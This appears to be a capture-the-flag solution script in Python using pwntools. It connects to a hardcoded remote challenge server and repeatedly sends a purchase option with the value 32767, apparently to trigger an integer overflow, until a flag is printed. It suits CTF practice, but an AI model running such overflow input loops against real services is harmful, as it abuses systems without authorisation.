#!/bin/env python3

from pwn import remote
from pprint import pprint as pp


HOST = '68.183.37.61'
PORT = 30618

def main ():

    there_is_data = True

    conn = remote(HOST, PORT)

    for _ in range(20):  # drop the splash screen ascii art
        conn.recvline()

    while True:
        data = conn.recvuntil([b"(9999 p.c.)",b"}"])
        if b"}" in data:
            pp(data.split(b'\n'))
            conn.close()
            exit(0)

        conn.sendline("2")
        conn.sendline("32767")
        conn.sendline("2")
        conn.sendline("32767")
        conn.sendline("2")
        conn.sendline("32767")


if __name__ == '__main__':
    main()